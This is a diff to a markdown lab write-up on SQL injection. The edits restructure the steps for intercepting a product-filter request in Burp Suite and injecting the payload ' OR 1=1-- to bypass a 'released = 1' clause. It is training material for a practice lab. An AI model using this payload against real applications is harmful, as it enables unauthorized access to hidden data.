@@ -16,17 +16,28 @@ To solve the lab, perform a SQL injection attack that causes the application to 
 ### 1. Intercept the GET request using Burp Suite
 ```http
 GET /filter?category=Corporate+gifts HTTP/2
+...
 ```
 
 ### 2. Modify the category parameter to inject SQL
-**Injected Payload:**
+
+**Injected payload:**
+
+```sql
+' OR 1=1--
+```
+
+Selecting injected sql and pressing "⌘U" in Burp Suite URL-encodes the selected portion of request.
+
+**The GET request becomes:**
+
 ```http
 GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
 ```
 
 ### 3. Explanation
 
-`' OR 1=1--` closes the string with `'` and creates a condition that always returns true, bypassing the released = 1 clause. The `--` comments out the rest of the SQL query.
+`' OR 1=1--` closes the string with `'` and creates a condition that always returns true, bypassing the `released = 1` clause. The `--` comments out the rest of the SQL query.
 
 **The SQL query becomes:**
 
